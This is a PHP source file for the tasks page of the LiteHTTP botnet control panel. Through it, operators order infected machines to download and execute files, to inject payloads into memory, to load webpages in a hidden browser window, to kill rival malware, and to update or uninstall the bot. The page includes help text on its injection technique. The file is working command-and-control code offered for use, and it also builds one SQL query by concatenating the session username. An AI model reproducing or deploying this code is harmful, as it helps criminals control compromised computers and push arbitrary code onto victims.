<?php
$u = explode(":", $_SESSION['LiteHTTP']);
$username = $u[0];
$userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);

include 'inc/stats.php';
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Control Panel</title>
	<meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<link href="css/datatables/dataTables.bootstrap.css" rel="stylesheet" type="text/css" />
	<!--[if lt IE 9]>
		<script src="js/html5shiv.js"></script>
		<script src="js/respond.min.js"></script>
	<![endif]-->
</head>
<body class="wysihtml5-supported skin-black fixed">
	<header class="header">
		<a href="?p=main" class="logo">
			LiteHTTP
		</a>
		<nav class="navbar navbar-static-top" role="navigation">
			<div class="navbar-right">
				<ul class="nav navbar-nav">
					<li class="dropdown user user-menu">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown">
							<i class="glyphicon glyphicon-user"></i>
							<span><?php echo $username; ?> <i class="caret"></i></span>
						</a>
						<ul class="dropdown-menu">
							<li class="user-footer">
								<div class="pull-left">
									<a href="?p=account" class="btn btn-default btn-flat">Edit Account</a>
								</div>
								<div class="pull-right">
									<a href="?p=logout" class="btn btn-default btn-flat">Logout</a>
								</div>
							</li>
						</ul>
					</li>
				</ul>
			</div>
		</nav>
	</header>
	<div class="wrapper row-offcanvas row-offcanvas-left">
		<aside class="left-side sidebar-offcanvas">
			<section class="sidebar">
				<ul class="sidebar-menu">
					<li>
						<a href="?p=main">
							<i class="fa fa-dashboard"></i> <span>Dashboard</span>
						</a>
					</li>
					<li>
						<a href="?p=bots">
							<i class="fa fa-list"></i> <span>Bots</span>
							<small class="badge pull-right bg-green"><?php echo $online; ?></small>
						</a>
					</li>
					<li class="active">
						<a href="?p=tasks">
							<i class="fa fa-bar-chart"></i> <span>Tasks</span>
						</a>
					</li>
					<li>
						<a href="?p=settings">
							<i class="fa fa-cog"></i> <span>Settings</span>
						</a>
					</li>
					<li>
						<a href="?p=users">
							<i class="fa fa-users"></i> <span>Users</span>
						</a>
					</li>
					<li>
						<a href="?p=logs">
							<i class="fa fa-list-alt"></i> <span>Panel Logs</span>
						</a>
					</li>
					<li>
						<a href="?p=help">
							<i class="fa fa-question"></i> <span>Help</span>
						</a>
					</li>
				</ul>
			</section>
		</aside>
		<aside class="right-side">
			<section class="content">
				<div class="row">
					<div class="col-lg-12 col-xs-24">
						<?php
						if (isset($_GET['act']))
						{
							if (!isset($_GET['id']))
							{
								echo '<div class="alert alert-danger">No task ID specified. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
							}else{
								$act = $_GET['act'];
								$tid = $_GET['id'];
								if (ctype_digit($tid))
								{
									if (ctype_alnum($act))
									{
										$arr = array('pause', 'resume', 'restart', 'delete');
										if (in_array($act, $arr))
										{
											$cnt = $odb->prepare("SELECT COUNT(*) FROM tasks WHERE id = :i");
											$cnt->execute(array(":i" => $tid));
											if ($cnt->fetchColumn(0) > 0)
											{
												$cre = $odb->prepare("SELECT username FROM tasks WHERE id = :i");
												$cre->execute(array(":i" => $tid));
												$cr = $cre->fetchColumn(0);
												$cpermss = $odb->prepare("SELECT privileges FROM users WHERE username = :u");
												$cpermss->execute(array(":u" => $cr));
												$cperms = $cpermss->fetchColumn(0);
												if ($userperms == "moderator" && $cperms == "admin")
												{
													echo '<div class="alert alert-danger">You cannot manage tasks created by administrators.</div>';
												}else{
													if ($userperms == "user" && strtolower($cr) != strtolower($username))
													{
														echo '<div class="alert alert-danger">You cannot manage tasks created by other users.</div>';
													}else{
														switch ($act)
														{
															case "pause":
																$up = $odb->prepare("UPDATE tasks SET status = '2' WHERE id = :i LIMIT 1");
																$up->execute(array(":i" => $tid));
																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Paused task #'.$tid));
																echo '<div class="alert alert-success">Task has been paused. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
																break;
															case "resume":
																$up = $odb->prepare("UPDATE tasks SET status = '1' WHERE id = :i LIMIT 1");
																$up->execute(array(":i" => $tid));
																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Resumed task #'.$tid));
																echo '<div class="alert alert-success">Task has been resumed. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
																break;
															case "restart":
																$de = $odb->prepare("DELETE FROM tasks_completed WHERE taskid = :i");
																$de->execute(array(":i" => $tid));
																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Restarted task #'.$tid));
																echo '<div class="alert alert-success">Task successfully restarted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
																break;
															case "delete":
																$de = $odb->prepare("DELETE FROM tasks_completed WHERE taskid = :i");
																$de->execute(array(":i" => $tid));
																$da = $odb->prepare("DELETE FROM tasks WHERE id = :i");
																$da->execute(array(":i" => $tid));
																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Deleted task #'.$tid));
																echo '<div class="alert alert-success">Task successfully deleted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
																break;
														}
													}
												}
											}else{
												echo '<div class="alert alert-danger">Task not found in database. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
											}
										}else{
											echo '<div class="alert alert-danger">Invalid task action. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
										}
									}else{
										echo '<div class="alert alert-danger">Task action was not alpha-numeric. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
									}
								}else{
									echo '<div class="alert alert-danger">Task ID was not a digit. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
								}
							}
						}
						if (isset($_POST['addTask']))
						{
							$task = $_POST['task'];
							$params = base64_encode($_POST['params']);
							if ($params == "" || $params == NULL)
							{
								$params = base64_encode("None");
							}
							$filters = base64_encode($_POST['filter']);
							if ($filters == "" || $filters == NULL)
							{
								$filters = base64_encode("None");
							}
							$exs = $_POST['execs'];
							if (ctype_digit($task))
							{
								if (ctype_digit($exs) || $exs == "" || $exs == NULL)
								{
									if ($exs == "" || $exs == NULL)
									{
										$exs = "unlimited";
									}
									if ($task == "9" || $task == "10")
									{
										if ($userperms != "admin")
										{
											echo '<div class="alert alert-danger">You do not have permission to use this command.</div>';
										}else{
											$i = $odb->prepare("INSERT INTO tasks VALUES(NULL, :t, :p, :f, :e, :u, '1', UNIX_TIMESTAMP())");
											$i->execute(array(":t" => $task, ":p" => $params, ":f" => $filters, ":e" => $exs, ":u" => $username));
											$i2 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
											$i2->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Created task #'.$odb->query("SELECT id FROM tasks ORDER BY id DESC LIMIT 1")->fetchColumn(0)));
											echo '<div class="alert alert-success">Task successfully created. Reloading...</div><meta http-equiv="refresh" content="2">';
										}
									}else{
										$i = $odb->prepare("INSERT INTO tasks VALUES(NULL, :t, :p, :f, :e, :u, '1', UNIX_TIMESTAMP())");
										$i->execute(array(":t" => $task, ":p" => $params, ":f" => $filters, ":e" => $exs, ":u" => $username));
										$i2 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
										$i2->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Created task #'.$odb->query("SELECT id FROM tasks ORDER BY id DESC LIMIT 1")->fetchColumn(0)));
										echo '<div class="alert alert-success">Task successfully created. Reloading...</div><meta http-equiv="refresh" content="2">';
									}
								}else{
									echo '<div class="alert alert-danger">Invalid number of executions.</div>';
								}
							}else{
								echo '<div class="alert alert-danger">Task type was not a digit.</div>';
							}
						}
						?>
						<h4>Current Tasks</h4>
						<table id="currenttasks" class="table table-condensed table-bordered table-striped table-hover">
							<thead>
								<tr>
									<th>#</th>
									<th>Creator</th>
									<th>Task</th>
									<th>Parameters</th>
									<th>Filter(s)</th>
									<th>Executions</th>
									<th>Date Created</th>
									<th>Status</th>
									<th>Actions</th>
								</tr>
							</thead>
							<tbody>
								<?php
								$tasks = $odb->query("SELECT * FROM tasks");
								while ($t = $tasks->fetch(PDO::FETCH_ASSOC))
								{
									$execs = $odb->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i");
									$execs->execute(array(":i" => $t['id']));
									$ex = $execs->fetchColumn(0);
									$tsk = "";
									switch ($t['task'])
									{
										case "1":
											$tsk = "Download & Execute";
											break;
										case "2":
											$tsk = "Download & Execute (Inject)";
											break;
										case "3":
											$tsk = "Download & Execute (W/ Command Line Arguments)";
											break;
										case "4":
											$tsk = "Visit Webpage (Visible)";
											break;
										case "5":
											$tsk = "Visit Webpage (Hidden)";
											break;
										case "6":
											$tsk = "Botkill Cycle";
											break;
										case "7":
											$tsk = "Enable Proactives";
											break;
										case "8":
											$tsk = "Disable Proactives";
											break;
										case "9":
											$tsk = "Update";
											break;
										case "10":
											$tsk = "Uninstall";
											break;
									}
									$st = "";
									if ($t['status'] == "1")
									{
										if ($ex == $t['executions'])
										{
											$st = '<small class="badge bg-green">Completed</small>';
										}else{
											$st = '<small class="badge bg-yellow">Running</small>';
										}
									}else{
										$st = '<small class="badge bg-red">Paused</small>';
									}
									$actions = "<center>";
									if ($t['status'] == "1")
									{
										$actions .= '<a href="?p=tasks&id='.$t['id'].'&act=pause" title="Pause Task"><i class="fa fa-pause"></i></a>&nbsp;';
									}else{
										$actions .= '<a href="?p=tasks&id='.$t['id'].'&act=resume" title="Resume Task"><i class="fa fa-play"></i></a>&nbsp;';
									}
									if ($t['executions'] != "unlimited")
									{
										if ($ex == $t['executions'])
										{
											$actions .= '<a href="?p=tasks&id='.$t['id'].'&act=restart" title="Restart Task"><i class="fa fa-undo"></i></a>&nbsp;';
										}
									}
									$actions .= '<a href="?p=tasks&id='.$t['id'].'&act=delete" title="Delete Task"><i class="fa fa-times-circle"></i></a></center>';
									echo '<tr><td>'.$t['id'].'</td><td>'.$t['username'].'</td><td>'.$tsk.'</td><td>'.base64_decode($t['params']).'</td><td>'.base64_decode($t['filters']).'</td><td>'.$ex.'/'.$t['executions'].'</td><td data-order="'.$t['date'].'">'.date("m-d-Y, h:i A", $t['date']).'</td><td>'.$st.'</td><td>'.$actions.'</td></tr>';
								}
								?>
							</tbody>
						</table>
						<hr>
					</div>
					<div class="col-lg-6 col-xs-12">
						<div class="nav-tabs-custom">
							<div class="tab-content">
								<h4>New Task</h4>
								<br>
								<form action="" method="POST" class="col-lg-8">
									<label>Task Type</label>
									<select name="task" class="form-control">
										<optgroup label="Downloads">
											<option value="1">Download & Execute</option>
											<option value="2">Download & Execute (Inject)</option>
											<option value="3">Download & Execute (W/ Command Line Arguments)</option>
										</optgroup>
										<optgroup label="Webpages">
											<option value="4">Visit Webpage (Visible)</option>
											<option value="5">Visit Webpage (Hidden)</option>
										</optgroup>
										<optgroup label="Botkiller">
											<option value="6">Botkill Cycle</option>
											<option value="7">Enable Proactives</option>
											<option value="8">Disable Proactives</option>
										</optgroup>
										<?php
										if ($userperms == "admin")
										{
											echo '<optgroup label="Bot Management">
													<option value="9">Update</option>
													<option value="10">Uninstall</option>
												</optgroup>';
										}
										?>
									</select>
									<br>
									<label>Parameters</label>
									<input type="text" class="form-control" name="params" placeholder="Ex: http://site.com/file.exe">
									<br>
									<label>Filters</label>
									<input type="text" class="form-control" name="filter" placeholder="Leave blank for no filter(s)" disabled title="Filters are being re-worked, disabled for now">
									<br>
									<label>Number of Executions</label>
									<input type="text" class="form-control" name="execs" placeholder="Leave blank for unlimited">
									<br>
									<center><input type="submit" class="btn btn-success" name="addTask" value="Add New Task"></center>
								</form>
								<div class="clearfix"></div>
							</div>
						</div>
					</div>
					<div class="col-lg-6 col-xs-12">
						<h2>Help</h2>
						<br>
						<h4><b>Download & Execute (Inject)</b></h4>
						<p>This command allows you to inject the file instead of dropping it to disk. Please note that this command will most likely break the injected bot's startup function, unless it creates a copy of itself to the disk. <b>This is only for native files</b>.</p>
						<br>
						<h4><b>Download & Execute (W/ Command Line Arguments)</b></h4>
						<p>This command allows you to download and run a file, and include command line parameters.</p>
						<br>
						<h4><b>Visit Webpage (Hidden)</b></h4>
						<p>This command completely hides the browser window from the user, but also prevents any interaction. This option is best for views only.</p>
						<br>
						<h4><b>Enable/Disable Proactives</b></h4>
						<p>These commands toggle the Proactive Botkiller. The Proactive Botkiller runs in the background, checking for other malware.</p>
						<br>
						<p>View help page for detailed information on parameters and filters.</p>
					</div>
				</div>
			</section>
		</aside>
	</div>
	<script src="js/jquery.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/jquery-ui.min.js" type="text/javascript"></script>
	<script src="js/plugins/datatables/jquery.dataTables.js" type="text/javascript"></script>
	<script src="js/plugins/datatables/dataTables.bootstrap.js" type="text/javascript"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			$("#currenttasks").dataTable({
				"paging": false,
				"info": false,
				"filter": false,
				"order": [[6, "desc"]]
			});
		});
	</script>
</body>
</html>